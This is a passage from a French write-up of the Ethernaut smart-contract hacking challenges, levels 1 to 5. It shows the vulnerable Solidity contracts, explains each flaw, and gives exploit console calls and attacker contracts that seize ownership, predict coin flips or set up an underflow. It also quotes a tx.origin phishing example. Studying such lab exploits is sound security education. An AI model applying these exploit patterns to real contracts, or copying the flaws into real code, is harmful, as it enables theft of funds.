<p>Utiliser <code class="highlighter-rouge">contribute()</code>: cela risque de prendre un peu de temps… pour passer de 0.001 à 1000 ethers, et cela nous oblige a trouver 1000 ethers.</p>

<p>Utiliser la fallback function: aucune protection particulière, il faudra simplement s’assurer d’avoir une contribution avant d’appeler cette fonction. On comprend alors pourquoi le challenge s’appelle <strong>Fallback</strong>.</p>

<h3 id="attaque">Attaque</h3>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// we are not owner :(</span>
<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">owner</span><span class="p">()</span> <span class="o">==</span> <span class="nx">player</span>
<span class="kc">false</span>

<span class="c1">// contribution of the owner</span>
<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">contributions</span><span class="p">(</span><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">owner</span><span class="p">())</span>
<span class="s2">"10000000"</span>

<span class="c1">// call contribute() function with small contribution</span>
<span class="o">&gt;</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">contribute</span><span class="p">({</span><span class="na">value</span><span class="p">:</span><span class="nx">toWei</span><span class="p">(</span><span class="s2">"0.00000001"</span><span class="p">)})</span>

<span class="c1">// call fallback function</span>
<span class="o">&gt;</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">sendTransaction</span><span class="p">({</span><span class="na">value</span><span class="p">:</span><span class="nx">toWei</span><span class="p">(</span><span class="s2">"0.00000001"</span><span class="p">)})</span>

<span class="c1">// we are owner :)</span>
<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">owner</span><span class="p">()</span> <span class="o">==</span> <span class="nx">player</span>
<span class="kc">true</span>

<span class="c1">// get money</span>
<span class="o">&gt;</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">()</span>
</code></pre></div></div>

<blockquote>
  <p>You know the basics of how ether goes in and out of contracts, including the usage of the fallback method.</p>

  <p>You’ve also learnt about OpenZeppelin’s Ownable contract, and how it can be used to restrict the usage of some methods to a priviledged address.</p>

  <p>Move on to the next level when you’re ready!</p>
</blockquote>

<hr />

<h2 id="2---fallout">2 - Fallout</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>

  <p>Erreur sur le nom du constructeur, n’importe qui peut alors l’appeler (étant donné qu’il sera considéré comme un fonction comme les autres) !</p>
</blockquote>

<p>Claim ownership of the contract below to complete this level.</p>

<p>Things that might help</p>

<ul>
  <li>Solidity Remix IDE</li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="s1">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Fallout</span> <span class="p">{</span>
  
  <span class="nx">using</span> <span class="nx">SafeMath</span> <span class="k">for</span> <span class="nx">uint256</span><span class="p">;</span>
  <span class="nx">mapping</span> <span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint</span><span class="p">)</span> <span class="nx">allocations</span><span class="p">;</span>
  <span class="nx">address</span> <span class="nx">payable</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>

  <span class="cm">/* constructor */</span>
  <span class="kd">function</span> <span class="nx">Fal1out</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
    <span class="nx">allocationsa</span><span class="p">[</span><span class="nx">owner</span><span class="p">]</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="nx">modifier</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
	<span class="nx">require</span><span class="p">(</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">owner</span><span class="p">,</span> <span class="s2">"caller is not the owner"</span> <span class="p">);</span>
	<span class="nx">_</span><span class="p">;</span>
	    <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">allocate</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
    <span class="nx">allocations</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">=</span> <span class="nx">allocations</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">].</span><span class="nx">add</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">sendAllocation</span><span class="p">(</span><span class="nx">address</span> <span class="nx">payable</span> <span class="nx">allocator</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">require</span><span class="p">(</span><span class="nx">allocations</span><span class="p">[</span><span class="nx">allocator</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
    <span class="nx">allocator</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">allocations</span><span class="p">[</span><span class="nx">allocator</span><span class="p">]);</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">collectAllocations</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
    <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">allocatorBalance</span><span class="p">(</span><span class="nx">address</span> <span class="nx">allocator</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">allocations</span><span class="p">[</span><span class="nx">allocator</span><span class="p">];</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="analyse-1">Analyse</h3>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* constructor */</span>
<span class="kd">function</span> <span class="nx">Fal1out</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
    <span class="nx">allocationsa</span><span class="p">[</span><span class="nx">owner</span><span class="p">]</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Ce code est censé jouer le rôle de constructeur du smart contract sauf que le nom de la fonction ne correspond pas exactement au nom du contrat, le lettre <code class="highlighter-rouge">l</code> a été remplacée par un <code class="highlighter-rouge">1</code>. Cette fonction n’est donc pas le constructeur du smart contract, c’est alors une fonction comme les autres, appelable par n’importe qui.</p>

<p>Nous allons simplement appeler la fonction <code class="highlighter-rouge">Fal1out()</code> pour devenir <code class="highlighter-rouge">owner</code>.</p>

<h3 id="attaque-1">Attaque</h3>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">owner</span><span class="p">()</span> <span class="o">==</span> <span class="nx">player</span>
<span class="kc">false</span>

<span class="o">&gt;</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">Fal1out</span><span class="p">()</span>

<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">owner</span><span class="p">()</span> <span class="o">==</span> <span class="nx">player</span>
<span class="kc">true</span>
</code></pre></div></div>

<blockquote>
  <p>That was silly wasn’t it? Real world contracts must be much more  secure than this and so must it be much harder to hack them right?</p>

  <p>Well… Not quite.</p>

  <p>The story of Rubixi is a very well known case in the Ethereum ecosystem.  The company changed its name from ‘Dynamic Pyramid’ to ‘Rubixi’ but  somehow they didn’t rename the constructor method of its contract:</p>

  <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span> <span class="nx">Rubixi</span> <span class="p">{</span>
<span class="nx">address</span> <span class="kr">private</span> <span class="nx">owner</span><span class="p">;</span>
<span class="kd">function</span> <span class="nx">DynamicPyramid</span><span class="p">()</span> <span class="p">{</span> <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span> <span class="p">}</span>
<span class="kd">function</span> <span class="nx">collectAllFees</span><span class="p">()</span> <span class="p">{</span> <span class="nx">owner</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">balance</span><span class="p">)</span> <span class="p">}</span>
<span class="p">...</span>
</code></pre></div>  </div>

  <p>This allowed the attacker to call the old constructor  and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland.</p>
</blockquote>

<hr />

<h2 id="3---coin-flip">3 - Coin Flip</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>

  <p>Utilisation d’aléa basé sur des données prédictibles (<code class="highlighter-rouge">block.number</code>).</p>
</blockquote>

<p>This is a coin flipping game where you need to build up your winning  streak by guessing the outcome of a coin flip. To complete this level  you’ll need to use your psychic abilities to guess the correct outcome  10 times in a row.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="s1">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">CoinFlip</span> <span class="p">{</span>

  <span class="nx">using</span> <span class="nx">SafeMath</span> <span class="k">for</span> <span class="nx">uint256</span><span class="p">;</span>
  <span class="nx">uint256</span> <span class="kr">public</span> <span class="nx">consecutiveWins</span><span class="p">;</span>
  <span class="nx">uint256</span> <span class="nx">lastHash</span><span class="p">;</span>
  <span class="nx">uint256</span> <span class="nx">FACTOR</span> <span class="o">=</span> <span class="mi">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="p">;</span>

  <span class="kd">constructor</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">consecutiveWins</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">flip</span><span class="p">(</span><span class="nx">bool</span> <span class="nx">_guess</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">uint256</span> <span class="nx">blockValue</span> <span class="o">=</span> <span class="nx">uint256</span><span class="p">(</span><span class="nx">blockhash</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">number</span><span class="p">.</span><span class="nx">sub</span><span class="p">(</span><span class="mi">1</span><span class="p">)));</span>

    <span class="k">if</span> <span class="p">(</span><span class="nx">lastHash</span> <span class="o">==</span> <span class="nx">blockValue</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">revert</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="nx">lastHash</span> <span class="o">=</span> <span class="nx">blockValue</span><span class="p">;</span>
    <span class="nx">uint256</span> <span class="nx">coinFlip</span> <span class="o">=</span> <span class="nx">blockValue</span><span class="p">.</span><span class="nx">div</span><span class="p">(</span><span class="nx">FACTOR</span><span class="p">);</span>
    <span class="nx">bool</span> <span class="nx">side</span> <span class="o">=</span> <span class="nx">coinFlip</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">?</span> <span class="kc">true</span> <span class="p">:</span> <span class="kc">false</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="nx">side</span> <span class="o">==</span> <span class="nx">_guess</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">consecutiveWins</span><span class="o">++</span><span class="p">;</span>
      <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="nx">consecutiveWins</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="analyse-2">Analyse</h3>

<p>Ce smart contract définit un jeu dans lequel il faut deviner la valeur qui sera tirée à chaque appel à <code class="highlighter-rouge">flip()</code>. La but est de deviner correctement les valeurs sur 10 tirages d’affilés.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">flip</span><span class="p">(</span><span class="nx">bool</span> <span class="nx">_guess</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">uint256</span> <span class="nx">blockValue</span> <span class="o">=</span> <span class="nx">uint256</span><span class="p">(</span><span class="nx">blockhash</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">number</span><span class="p">.</span><span class="nx">sub</span><span class="p">(</span><span class="mi">1</span><span class="p">)));</span>

	<span class="k">if</span> <span class="p">(</span><span class="nx">lastHash</span> <span class="o">==</span> <span class="nx">blockValue</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">revert</span><span class="p">();</span>
	<span class="p">}</span>

	<span class="nx">lastHash</span> <span class="o">=</span> <span class="nx">blockValue</span><span class="p">;</span>
    <span class="nx">uint256</span> <span class="nx">coinFlip</span> <span class="o">=</span> <span class="nx">blockValue</span><span class="p">.</span><span class="nx">div</span><span class="p">(</span><span class="nx">FACTOR</span><span class="p">);</span>
    <span class="nx">bool</span> <span class="nx">side</span> <span class="o">=</span> <span class="nx">coinFlip</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">?</span> <span class="kc">true</span> <span class="p">:</span> <span class="kc">false</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="nx">side</span> <span class="o">==</span> <span class="nx">_guess</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">consecutiveWins</span><span class="o">++</span><span class="p">;</span>
		<span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="nx">consecutiveWins</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>La fonction <code class="highlighter-rouge">flip()</code> réalise un tirage à partir de <code class="highlighter-rouge">block.number</code> puis le divise par la constante <code class="highlighter-rouge">FACTOR</code> et compare le résultat à <code class="highlighter-rouge">1</code>.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">uint256</span> <span class="nx">blockValue</span> <span class="o">=</span> <span class="nx">uint256</span><span class="p">(</span><span class="nx">blockhash</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">number</span><span class="p">.</span><span class="nx">sub</span><span class="p">(</span><span class="mi">1</span><span class="p">)));</span>
</code></pre></div></div>

<p>Le problème est que <code class="highlighter-rouge">block.number</code> est une variable globale, accessible depuis n’importe quel smart contract (si 2 transactions sont dans le même bloc, alors, ces dernières partageront le même <code class="highlighter-rouge">block.number</code>).</p>

<h3 id="attaque-2">Attaque</h3>

<p>Nous allons alors simplement créer un smart contract et effectuer des tirages pour deviner en avance la valeur attendue puis appeler le fonction <code class="highlighter-rouge">flip()</code> avec la bonne valeur et ainsi incrémenter <code class="highlighter-rouge">consecutiveWins</code> tirages après tirages.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span> <span class="nx">Attack</span> <span class="p">{</span>

  <span class="nx">using</span> <span class="nx">SafeMath</span> <span class="k">for</span> <span class="nx">uint256</span><span class="p">;</span>
  <span class="nx">CoinFlip</span> <span class="kr">public</span> <span class="nx">object</span><span class="p">;</span>
  <span class="nx">uint256</span> <span class="nx">FACTOR</span> <span class="o">=</span> <span class="mi">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="p">;</span>

  <span class="kd">function</span> <span class="nx">Attack</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">object</span> <span class="o">=</span> <span class="nx">CoinFlip</span><span class="p">(</span><span class="mh">0xaef3e3239f3724758f721c93767039c98362d7bb</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">go</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">uint256</span> <span class="nx">blockValue</span> <span class="o">=</span> <span class="nx">uint256</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">blockhash</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">number</span><span class="p">.</span><span class="nx">sub</span><span class="p">(</span><span class="mi">1</span><span class="p">)));</span>
    <span class="nx">uint256</span> <span class="nx">coinFlip</span> <span class="o">=</span> <span class="nx">blockValue</span><span class="p">.</span><span class="nx">div</span><span class="p">(</span><span class="nx">FACTOR</span><span class="p">);</span>
    
    <span class="nx">bool</span> <span class="nx">side</span> <span class="o">=</span> <span class="nx">coinFlip</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">?</span> <span class="kc">true</span> <span class="p">:</span> <span class="kc">false</span><span class="p">;</span>
    <span class="nx">bool</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">object</span><span class="p">.</span><span class="nx">flip</span><span class="p">(</span><span class="nx">side</span><span class="p">);</span>
    
    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">consecutiveWins</span><span class="p">()</span>
<span class="mi">0</span>

<span class="c1">// execute 10 times go() function from Attack contract</span>

<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">consecutiveWins</span><span class="p">()</span>
<span class="mi">10</span>
</code></pre></div></div>

<blockquote>
  <p>Generating random numbers in solidity can be tricky. There currently  isn’t a native way to generate them, and everything you use in smart  contracts is publicly visible, including the local variables and state  variables marked as private. Miners also have control over things like  blockhashes, timestamps, and whether to include certain transactions -  which allows them to bias these values in their favor.</p>

  <p>Some options include using Bitcoin block headers (verified through <a href="http://btcrelay.org">BTC Relay</a>), <a href="https://github.com/randao/randao">RANDAO</a>, or <a href="http://www.oraclize.it/">Oraclize</a>).</p>
</blockquote>

<hr />

<h2 id="4---telephone">4 - Telephone</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>

  <p>Différencier <code class="highlighter-rouge">msg.sender</code> et <code class="highlighter-rouge">tx.origin</code>.</p>
</blockquote>

<p>Claim ownership of the contract below to complete this level.</p>

<p>Things that might help</p>

<ul>
  <li>See the Help page above, section “Beyond the console”</li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Telephone</span> <span class="p">{</span>

  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>

  <span class="kd">constructor</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">changeOwner</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_owner</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span> <span class="o">!=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">owner</span> <span class="o">=</span> <span class="nx">_owner</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="analyse-3">Analyse</h3>

<p>Le but de ce niveau est de devenir <code class="highlighter-rouge">owner</code>.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span> <span class="o">!=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">_owner</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Pour cela, il faut que <code class="highlighter-rouge">tx.origin != msg.sender</code>. Après quelques recherches on tombe sur:</p>

<blockquote>
  <p>With <code class="highlighter-rouge">msg.sender</code>: the owner can be a contract.</p>

  <p>With <code class="highlighter-rouge">tx.origin</code>: the owner can never be a contract.</p>

  <p>In a simple call chain A-&gt;B-&gt;C, inside C <code class="highlighter-rouge">msg.sender</code> will be B, and <code class="highlighter-rouge">tx.origin</code> will be A.</p>
</blockquote>

<p>Nous devons alors simplement appeler la fonction <code class="highlighter-rouge">changeOwner()</code> depuis un autre smart contract pour respecter le condition.</p>

<h3 id="attaque-3">Attaque</h3>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span> <span class="nx">Attack</span> <span class="p">{</span>

  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">attacker</span><span class="p">;</span>
  <span class="nx">Telephone</span> <span class="nx">object</span><span class="p">;</span>

  <span class="kd">constructor</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">attacker</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
    <span class="nx">object</span> <span class="o">=</span> <span class="nx">Telephone</span><span class="p">(</span><span class="mh">0xe927cee2e1A0006Eb230e40C505FD09eA1AebD1b</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">go</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">object</span><span class="p">.</span><span class="nx">changeOwner</span><span class="p">(</span><span class="nx">attacker</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// we are not owner</span>
<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">owner</span><span class="p">()</span> <span class="o">==</span> <span class="nx">player</span>
<span class="kc">false</span>

<span class="c1">// get contract address</span>
<span class="o">&gt;</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">address</span>
<span class="s2">"0xa0783bd88924164fecb1aa02858effe62c081e4f"</span>

<span class="c1">// we are owner !</span>
<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">owner</span><span class="p">()</span> <span class="o">==</span> <span class="nx">player</span>
<span class="kc">true</span>
</code></pre></div></div>

<blockquote>
  <p>While this example may be simple, confusing <code class="highlighter-rouge">tx.origin</code> with <code class="highlighter-rouge">msg.sender</code> can lead to phishing-style attacks, such as <a href="https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/">this</a>.</p>

  <p>An example of a possible attack is outlined below.</p>

  <ol>
    <li>Use <code class="highlighter-rouge">tx.origin</code> to determine whose tokens to transfer, e.g.</li>
  </ol>

  <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function transfer(address _to, uint _value) {
  tokens[tx.origin] -= _value;
  tokens[_to] += _value;
}
</code></pre></div>  </div>

  <ol>
    <li>Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.</li>
  </ol>

  <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function () payable {
  token.transfer(attackerAddress, 10000);
}
</code></pre></div>  </div>

  <ol>
    <li>In this scenario, <code class="highlighter-rouge">tx.origin</code> will be the victim’s address (while <code class="highlighter-rouge">msg.sender</code> will be the malicious contract’s address), resulting in the funds being transferred from the victim to the attacker.</li>
  </ol>
</blockquote>

<hr />

<h2 id="5---token">5 - Token</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>

  <p>Réalisation d’un underflow sur une opération non protégée. Ce qui permet alors d’avoir un solde maximal.</p>
</blockquote>

<p>The goal of this level is for you to hack the basic token contract below.</p>

<p>You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.</p>

<p>Things that might help:</p>

<ul>
  <li>What is an odometer?</li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Token</span> <span class="p">{</span>

  <span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint</span><span class="p">)</span> <span class="nx">balances</span><span class="p">;</span>
  <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">totalSupply</span><span class="p">;</span>

  <span class="kd">constructor</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">_initialSupply</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">=</span> <span class="nx">totalSupply</span> <span class="o">=</span> <span class="nx">_initialSupply</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_to</span><span class="p">,</span> <span class="nx">uint</span> <span class="nx">_value</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">require</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-</span> <span class="nx">_value</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">);</span>
    <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="nx">_value</span><span class="p">;</span>
    <span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">]</span> <span class="o">+=</span> <span class="nx">_value</span><span class="p">;</span>
    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_owner</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint</span> <span class="nx">balance</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">balances</span><span class="p">[</span><span class="nx">_owner</span><span class="p">];</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="analyse-4">Analyse</h3>

<p>Ce smart contract permet de gérer des transferts entre les comptes des clients. La fonction <code class="highlighter-rouge">tranfert()</code> permet de réaliser une transaction, la fonction <code class="highlighter-rouge">balanceOf()</code> permet de consulter le solde d’un compte.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_to</span><span class="p">,</span> <span class="nx">uint</span> <span class="nx">_value</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">require</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-</span> <span class="nx">_value</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">);</span>
    <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="nx">_value</span><span class="p">;</span>
    <span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">]</span> <span class="o">+=</span> <span class="nx">_value</span><span class="p">;</span>
    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>On peut voir que la fonction effectue plusieurs opérations sans faire attention à des vulnérabilités de type, overflow ou underflow. Nous allons exploiter un underflow pour passer le <code class="highlighter-rouge">require(balances[msg.sender] - _value &gt;= 0)</code>.</p>

